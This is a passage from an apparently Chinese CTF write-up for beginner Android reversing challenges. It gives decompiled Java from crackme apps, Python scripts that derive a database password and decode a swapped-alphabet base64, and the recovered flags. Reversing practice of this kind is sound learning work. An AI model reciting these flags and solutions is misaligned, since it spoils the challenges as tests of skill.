class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">                <span class="keyword">byte</span> b = digest[i];</span><br><span class="line">                <span class="keyword">int</span> i3 = i2 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i2] = cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>];</span><br><span class="line">                i2 = i3 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i3] = cArr[b &amp; <span class="number">15</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(cArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">b</span><span class="params">(String str)</span> </span>&#123; <span class="comment">// 获取SHA1十六进制字符串</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = str.getBytes();</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">"SHA-1"</span>);</span><br><span class="line">            instance.update(bytes);</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest(); <span class="comment">// 获取SHA1哈希摘要</span></span><br><span class="line">            <span class="keyword">int</span> length = digest.length;</span><br><span class="line">            <span class="keyword">char</span>[] cArr2 = <span class="keyword">new</span> <span class="keyword">char</span>[(length * <span class="number">2</span>)];</span><br><span class="line">            <span class="keyword">int</span> i2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">                <span class="keyword">byte</span> b = digest[i];</span><br><span class="line">                <span class="keyword">int</span> i3 = i2 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i2] = cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>];</span><br><span class="line">                i2 = i3 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i3] = cArr[b &amp; <span class="number">15</span>];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(cArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么根据上面的分析可以正向地得到密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5hash = <span class="keyword">lambda</span> m: hashlib.md5(m).hexdigest()</span><br><span class="line">sha1hash = <span class="keyword">lambda</span> m: hashlib.sha1(m).hexdigest()</span><br><span class="line"></span><br><span class="line">name = <span class="string">"Stranger"</span></span><br><span class="line">password = <span class="string">"123456"</span></span><br><span class="line">a = name[:<span class="number">4</span>] + password[:<span class="number">4</span>]</span><br><span class="line">database = sha1hash(a + md5hash(a) + <span class="string">"yaphetshan"</span>)[:<span class="number">7</span>]</span><br><span class="line"><span class="keyword">print</span> database</span><br><span class="line"><span class="comment"># ae56f99</span></span><br></pre></td></tr></table></figure><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" alt="表中的F_l_a_g字段"></p><p>将字段中的字符串解 base64：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0="</span> | base64 -D</span><br><span class="line">Tctf&#123;H3ll0_Do_Y0u_Lov3_Tenc3nt!&#125;</span><br></pre></td></tr></table></figure><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testjava.jack.pingan1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">new</span> Base64New().Base64Encode(((EditText) MainActivity.<span class="keyword">this</span>.findViewById(R.id.editText)).getText().toString().getBytes()).equals(<span class="string">"5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs="</span>)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u9a8c\u8bc1\u901a\u8fc7!"</span>, <span class="number">1</span>).show(); <span class="comment">// 验证通过!</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">"\u9a8c\u8bc1\u5931\u8d25!"</span>, <span class="number">1</span>).show(); <span class="comment">// 验证失败!</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testjava.jack.pingan1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Base64New</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] Base64ByteToStr = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RANGE = <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] StrToBase64Byte = <span class="keyword">new</span> <span class="keyword">byte</span>[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bytes.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> k;</span><br><span class="line">            <span class="keyword">byte</span>[] enBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> tmp = (<span class="keyword">byte</span>) <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt;= <span class="number">2</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + k &lt;= bytes.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    enBytes[k] = (<span class="keyword">byte</span>) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * <span class="number">2</span>) + <span class="number">2</span>)) | tmp);</span><br><span class="line">                    tmp = (<span class="keyword">byte</span>) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((<span class="number">2</span> - k) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; RANGE) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    enBytes[k] = tmp;</span><br><span class="line">                    tmp = (<span class="keyword">byte</span>) <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            enBytes[<span class="number">3</span>] = tmp;</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (enBytes[k] &lt;= (<span class="keyword">byte</span>) <span class="number">63</span>) &#123;</span><br><span class="line">                    res.append(Base64ByteToStr[enBytes[k]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.append(<span class="string">'='</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接改表解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- encoding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">base64_charset = <span class="string">'vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/='</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">'5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='</span></span><br><span class="line">plaintext = decipher(ciphertext)</span><br><span class="line"><span class="keyword">print</span> plaintext</span><br><span class="line"><span class="comment"># 05397c42f9b6da593a3644162d36eb01</span></span><br></pre></td></tr></table></figure><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.c;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(String str, b bVar, a aVar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aVar.a(bVar.a(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title">b</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!str.startsWith(<span class="string">"flag&#123;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!str.endsWith(<span class="string">"&#125;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String substring = str.substring(<span class="number">5</span>, str.length() - <span class="number">1</span>);</span><br><span class="line">        b bVar = <span class="keyword">new</span> b(Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">        a aVar = <span class="keyword">new</span> a(Integer.valueOf(<span class="number">3</span>));</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> i2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; substring.length()) &#123;</span><br><span class="line">            stringBuilder.append(a(substring.charAt(i) + <span class="string">""</span>, bVar, aVar));</span><br><span class="line">            Integer valueOf = Integer.valueOf(bVar.b().intValue() / <span class="number">25</span>); <span class="comment">// 将bVar中d的值除以25并赋值给valueOf</span></span><br><span class="line">            <span class="keyword">if</span> (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                i2++;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Boolean.valueOf(stringBuilder.toString().equals(<span class="string">"wigwrkaugala"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> OnClickListener(<span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="comment">/* synthetic */</span> MainActivity b;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.b(((EditText) ((MainActivity) <span class="keyword">this</span>).findViewById(R.id.edit)).getText().toString()).booleanValue()) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">"You are right!"</span>, <span class="number">1</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(<span class="keyword">this</span>, <span class="string">"You are wrong! Bye~"</span>, <span class="number">1</span>).show();</span><br><span class="line">                <span class="keyword">new</span> Timer().schedule(<span class="keyword">new</span> TimerTask(<span class="keyword">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="comment">/* synthetic */</span> AnonymousClass1 a;</span><br><span class="line"></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">this</span>.a = r1;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        System.exit(<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;, <span class="number">2000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; a = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">static</span> String b = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    <span class="keyword">static</span> Integer d = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">    Integer[] c = <span class="keyword">new</span> Integer[]&#123;Integer.valueOf(<span class="number">7</span>), Integer.valueOf(<span class="number">14</span>), Integer.valueOf(<span class="number">16</span>), Integer.valueOf(<span class="number">21</span>), Integer.valueOf(<span class="number">4</span>), Integer.valueOf(<span class="number">24</span>), Integer.valueOf(<span class="number">25</span>), Integer.valueOf(<span class="number">20</span>), Integer.valueOf(<span class="number">5</span>), Integer.valueOf(<span class="number">15</span>), Integer.valueOf(<span class="number">9</span>), Integer.valueOf(<span class="number">17</span>), Integer.valueOf(<span class="number">6</span>), Integer.valueOf(<span class="number">13</span>), Integer.valueOf(<span class="number">3</span>), Integer.valueOf(<span class="number">18</span>), Integer.valueOf(<span class="number">12</span>), Integer.valueOf(<span class="number">10</span>), Integer.valueOf(<span class="number">19</span>), Integer.valueOf(<span class="number">0</span>), Integer.valueOf(<span class="number">22</span>), Integer.valueOf(<span class="number">2</span>), Integer.valueOf(<span class="number">11</span>), Integer.valueOf(<span class="number">23</span>), Integer.valueOf(<span class="number">1</span>), Integer.valueOf(<span class="number">8</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> intValue;</span><br><span class="line">        <span class="keyword">for</span> (intValue = num.intValue(); intValue &lt; <span class="keyword">this</span>.c.length; intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (intValue = <span class="number">0</span>; intValue &lt; num.intValue(); intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Integer num = d;</span><br><span class="line">        d = Integer.valueOf(d.intValue() + <span class="number">1</span>); <span class="comment">// 将d加一</span></span><br><span class="line">        <span class="keyword">if</span> (d.intValue() == <span class="number">25</span>) &#123; <span class="comment">// 判断d是否等于25</span></span><br><span class="line">            <span class="keyword">int</span> intValue = ((Integer) a.get(<span class="number">0</span>)).intValue();</span><br><span class="line">            a.remove(<span class="number">0</span>);</span><br><span class="line">            a.add(Integer.valueOf(intValue)); <span class="comment">// 将a的第一个元素添加到最后一位</span></span><br><span class="line">            d = Integer.valueOf(<span class="number">0</span>); <span class="comment">// 将d设置成0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        Integer valueOf = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (num.intValue() == -<span class="number">10</span>) &#123; <span class="comment">// 判断num是否为-10</span></span><br><span class="line">            a();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">" "</span>.charAt(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; a.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.get(i) == num) &#123;</span><br><span class="line">                valueOf = Integer.valueOf(i); <span class="comment">// 获取a中等于num的元素，并将valueOf设置成其下标i</span></span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        a();</span><br><span class="line">        <span class="keyword">return</span> b.charAt(valueOf.intValue()); <span class="comment">// 返回下标对应的b中的字符</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>b 类中同理，也是对下标的一个转换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; a = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">static</span> String b = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    <span class="keyword">static</span> Integer d = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">    Integer[] c = <span class="keyword">new</span> Integer[]&#123;Integer.valueOf(<span class="number">8</span>), Integer.valueOf(<span class="number">25</span>), Integer.valueOf(<span class="number">17</span>), Integer.valueOf(<span class="number">23</span>), Integer.valueOf(<span class="number">7</span>), Integer.valueOf(<span 